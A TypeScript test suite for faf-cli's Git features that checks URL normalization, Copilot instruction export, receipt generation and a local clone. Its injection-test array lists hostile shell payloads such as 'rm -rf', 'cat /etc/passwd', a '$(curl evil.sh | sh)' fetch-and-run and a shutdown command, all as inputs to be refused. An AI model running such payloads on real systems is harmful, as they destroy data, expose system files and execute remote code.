/**
 * WJTTC — ⭐️ The Git Edition Suite
 *
 * Locks down faf-cli's entire Git / GitHub surface so the edition is provably
 * safe, correct, and non-destructive:
 *
 *   • `faf git <url>`         — instant scored .faf from any GitHub repo
 *                               (URL safety + normalization; the clone is no-shell)
 *   • `faf export --copilot`  — emit GitHub Copilot's .github/copilot-instructions.md
 *                               (THE new tool this edition)
 *   • TAF receipt             — the verifiable ✪ proof a git-extracted context carries
 *
 * Tiers (F1-inspired):
 *   BRAKE  — catastrophic if broken (command injection, user data loss)
 *   ENGINE — core functionality (URL normalization, emit correctness, receipt shape)
 *   AERO   — polish / edge cases (unicode, name boundaries)
 *
 * Tier markers live on the describe() name so `faf wjttc` audits the balance.
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdirSync, writeFileSync, rmSync, existsSync, readFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { execFileSync } from 'child_process';
import { normalizeGitUrl } from '../../src/commands/git.js';
import { tafCommand } from '../../src/commands/taf.js';
import { assembleFreshFaf } from '../../src/detect/assemble.js';
import { writeFaf, readFafRaw } from '../../src/interop/faf.js';
import { scoreFafYaml } from '../../src/core/scorer.js';

const FAF = (name = 'git-suite') =>
  `faf_version: 2.5.0\nproject:\n  name: ${name}\n  goal: Test the Git Edition\n  main_language: TypeScript\n`;

let testDir: string;
let originalCwd: string;
function enterTmp(): void {
  testDir = join(tmpdir(), `wjttc-git-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(testDir, { recursive: true });
  originalCwd = process.cwd();
  process.chdir(testDir);
}
function leaveTmp(): void {
  process.chdir(originalCwd);
  rmSync(testDir, { recursive: true, force: true });
}

// ─────────────────────────────────────────────────────────────────────────────
// BRAKE — catastrophic if broken
// ─────────────────────────────────────────────────────────────────────────────

describe('WJTTC BRAKE: faf git — the URL is injection-proof', () => {
  // Each of these, if interpolated into a shell `git clone ... ${url}`, would
  // execute attacker commands. normalizeGitUrl must refuse every one.
  const INJECTIONS = [
    'https://github.com/x/y; rm -rf /tmp/pwned',
    'https://github.com/x/y && touch /tmp/pwned',
    'https://github.com/x/y | cat /etc/passwd',
    'https://github.com/x/y`whoami`',
    'https://github.com/x/y$(whoami)',
    'x/y; echo hacked',
    'owner/repo & shutdown -h now',
    '$(curl evil.sh | sh)',
    'https://github.com/x/y > /etc/passwd',
    "https://github.com/x/y' OR '1'='1",
    'x/y\n rm -rf ~',
    'x/y\t&& evil',
  ];
  for (const payload of INJECTIONS) {
    test(`BRAKE: refuses injection payload ${JSON.stringify(payload)}`, () => {
      expect(() => normalizeGitUrl(payload)).toThrow();
    });
  }

  test('BRAKE: refuses empty / whitespace-only input', () => {
    expect(() => normalizeGitUrl('')).toThrow();
    expect(() => normalizeGitUrl('   ')).toThrow();
    expect(() => normalizeGitUrl(undefined as unknown as string)).toThrow();
  });

  test('BRAKE: only ever returns an https github URL or a vetted http(s) URL', () => {
    // Whatever it returns must itself be metacharacter-free and scheme-anchored.
    for (const safe of ['Wolfe-Jam/faf-cli', 'https://github.com/a/b', 'github.com/a/b']) {
      const out = normalizeGitUrl(safe);
      expect(out.startsWith('https://') || out.startsWith('http://')).toBe(true);
      expect(/[\s;&|`$(){}<>\\^'"]/.test(out)).toBe(false);
    }
  });
});

describe('WJTTC BRAKE: faf export --copilot — never destroys user content', () => {
  beforeEach(enterTmp);
  afterEach(leaveTmp);

  test('BRAKE: preserves hand-written content outside the faf block', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('preserve'));
    mkdirSync(join(testDir, '.github'), { recursive: true });
    const userText = '# MY HAND-WRITTEN COPILOT NOTES\n\nNever clobber this.\n';
    writeFileSync(join(testDir, '.github', 'copilot-instructions.md'), userText);

    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ copilot: true });

    const out = readFileSync(join(testDir, '.github', 'copilot-instructions.md'), 'utf-8');
    expect(out).toContain('MY HAND-WRITTEN COPILOT NOTES');
    expect(out).toContain('Never clobber this.');
    expect(out).toContain('<!-- faf:start -->');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// ENGINE — core functionality
// ─────────────────────────────────────────────────────────────────────────────

describe('WJTTC ENGINE: faf git — URL normalization', () => {
  test('ENGINE: owner/repo shorthand → canonical github https', () => {
    expect(normalizeGitUrl('Wolfe-Jam/faf-cli')).toBe('https://github.com/Wolfe-Jam/faf-cli.git');
  });
  test('ENGINE: full https URL gets a single .git suffix', () => {
    expect(normalizeGitUrl('https://github.com/Wolfe-Jam/faf-cli')).toBe(
      'https://github.com/Wolfe-Jam/faf-cli.git',
    );
  });
  test('ENGINE: .git suffix is idempotent (never doubled)', () => {
    expect(normalizeGitUrl('https://github.com/x/y.git')).toBe('https://github.com/x/y.git');
    expect(normalizeGitUrl('x/y.git')).toBe('https://github.com/x/y.git');
  });
  test('ENGINE: trailing slash tolerated', () => {
    expect(normalizeGitUrl('https://github.com/x/y/')).toBe('https://github.com/x/y.git');
    expect(normalizeGitUrl('x/y/')).toBe('https://github.com/x/y.git');
  });
  test('ENGINE: github.com/owner/repo (no scheme) → https', () => {
    expect(normalizeGitUrl('github.com/x/y')).toBe('https://github.com/x/y.git');
  });
});

describe('WJTTC ENGINE: faf export --copilot — the new Git Edition tool', () => {
  beforeEach(enterTmp);
  afterEach(leaveTmp);

  test('ENGINE: emits to .github/copilot-instructions.md and creates .github', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('copilot-engine'));
    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ copilot: true });

    const out = join(testDir, '.github', 'copilot-instructions.md');
    expect(existsSync(out)).toBe(true);
    const c = readFileSync(out, 'utf-8');
    expect(c).toContain('copilot-engine');
    expect(c).toContain('GitHub Copilot Instructions');
  });

  test('ENGINE: included in --all', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('all-test'));
    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ all: true });
    expect(existsSync(join(testDir, '.github', 'copilot-instructions.md'))).toBe(true);
  });

  test('ENGINE: --copilot alone does not write the other formats (exportAll guard)', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('guard'));
    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ copilot: true });
    expect(existsSync(join(testDir, '.github', 'copilot-instructions.md'))).toBe(true);
    expect(existsSync(join(testDir, 'AGENTS.md'))).toBe(false);
    expect(existsSync(join(testDir, 'GEMINI.md'))).toBe(false);
  });

  test('ENGINE: idempotent — exactly one faf block after re-runs', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('idem'));
    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ copilot: true });
    exportCommand({ copilot: true });
    const c = readFileSync(join(testDir, '.github', 'copilot-instructions.md'), 'utf-8');
    expect(c.split('<!-- faf:start -->').length - 1).toBe(1);
  });
});

describe('WJTTC ENGINE: TAF receipt — the proof a git-extracted context carries', () => {
  beforeEach(enterTmp);
  afterEach(leaveTmp);

  test('ENGINE: faf taf writes a well-formed ✪ receipt over a .faf', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('taf-shape'));
    const receiptPath = join(testDir, 'receipt.json');
    tafCommand({ output: receiptPath });

    expect(existsSync(receiptPath)).toBe(true);
    const r = JSON.parse(readFileSync(receiptPath, 'utf-8'));
    expect(r.taf_version).toBe('1.0.0');
    expect(r.project).toBe('taf-shape');
    expect(typeof r.score).toBe('number');
    expect(typeof r.tier).toBe('string');
    expect(typeof r.total).toBe('number');
    expect(r.slots).toBeDefined();
  });

  test('ENGINE: receipt is deterministic for the same context (score/tier stable)', () => {
    writeFileSync(join(testDir, 'project.faf'), FAF('taf-determinism'));
    const a = join(testDir, 'a.json');
    const b = join(testDir, 'b.json');
    tafCommand({ output: a });
    tafCommand({ output: b });

    const ra = JSON.parse(readFileSync(a, 'utf-8'));
    const rb = JSON.parse(readFileSync(b, 'utf-8'));
    // The proof must be stable across runs — only the `generated` timestamp may differ.
    expect(rb.score).toBe(ra.score);
    expect(rb.tier).toBe(ra.tier);
    expect(rb.total).toBe(ra.total);
    expect(rb.populated).toBe(ra.populated);
    expect(JSON.stringify(rb.slots)).toBe(JSON.stringify(ra.slots));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// AERO — polish / edge cases
// ─────────────────────────────────────────────────────────────────────────────

describe('WJTTC AERO: faf git — name boundaries', () => {
  test('AERO: dots, dashes, underscores allowed in owner/repo', () => {
    expect(normalizeGitUrl('my.org/my_repo-2')).toBe('https://github.com/my.org/my_repo-2.git');
  });
  test('AERO: rejects a single segment (no repo)', () => {
    expect(() => normalizeGitUrl('justowner')).toThrow();
  });
  test('AERO: rejects three+ segment shorthand', () => {
    expect(() => normalizeGitUrl('a/b/c')).toThrow();
  });
  test('AERO: non-github http(s) full URL passes through with .git', () => {
    expect(normalizeGitUrl('https://gitlab.com/group/proj')).toBe('https://gitlab.com/group/proj.git');
  });
});

describe('WJTTC AERO: faf export --copilot — unicode & emoji survive', () => {
  beforeEach(enterTmp);
  afterEach(leaveTmp);

  test('AERO: emoji + multi-script project name flows into the file verbatim', () => {
    const exotic = '🏎️-café-проект-日本語';
    writeFileSync(join(testDir, 'project.faf'), FAF(exotic));
    const { exportCommand } = require('../../src/commands/export.js');
    exportCommand({ copilot: true });
    const c = readFileSync(join(testDir, '.github', 'copilot-instructions.md'), 'utf-8');
    expect(c).toContain(exotic);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// TYRE — live, the real road (a real git clone, kept network-free for signal)
// ─────────────────────────────────────────────────────────────────────────────

describe('WJTTC TYRE: faf git — the real road (real clone → real .faf → real score)', () => {
  test('TYRE: a real git clone of a local repo yields a detected, scored .faf', () => {
    const src = join(tmpdir(), `tyre-src-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    const dest = join(tmpdir(), `tyre-dst-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    mkdirSync(src, { recursive: true });
    try {
      // A real source repo on disk (the road faf git actually drives).
      writeFileSync(
        join(src, 'package.json'),
        JSON.stringify({ name: 'tyre-demo', version: '1.0.0', dependencies: { react: '^18.0.0' } }, null, 2),
      );
      writeFileSync(join(src, 'README.md'), '# tyre-demo\n');
      execFileSync('git', ['init', '-q'], { cwd: src, stdio: 'pipe' });
      execFileSync('git', ['add', '-A'], { cwd: src, stdio: 'pipe' });
      execFileSync('git', ['-c', 'user.email=t@faf.one', '-c', 'user.name=faf', 'commit', '-qm', 'init'], {
        cwd: src,
        stdio: 'pipe',
      });

      // The EXACT no-shell clone path faf git uses — local source, no network.
      execFileSync('git', ['clone', '--depth', '1', '--', src, dest], { stdio: 'pipe' });
      expect(existsSync(join(dest, 'package.json'))).toBe(true);

      // The real extraction + scoring pipeline on the cloned repo.
      const data = assembleFreshFaf(dest);
      expect(data).toBeDefined();
      const fafPath = join(dest, 'project.faf');
      writeFaf(fafPath, data);
      const result = scoreFafYaml(readFafRaw(fafPath));
      expect(typeof result.score).toBe('number');
      expect(result.score).toBeGreaterThan(0);
    } finally {
      rmSync(src, { recursive: true, force: true });
      rmSync(dest, { recursive: true, force: true });
    }
  });
});
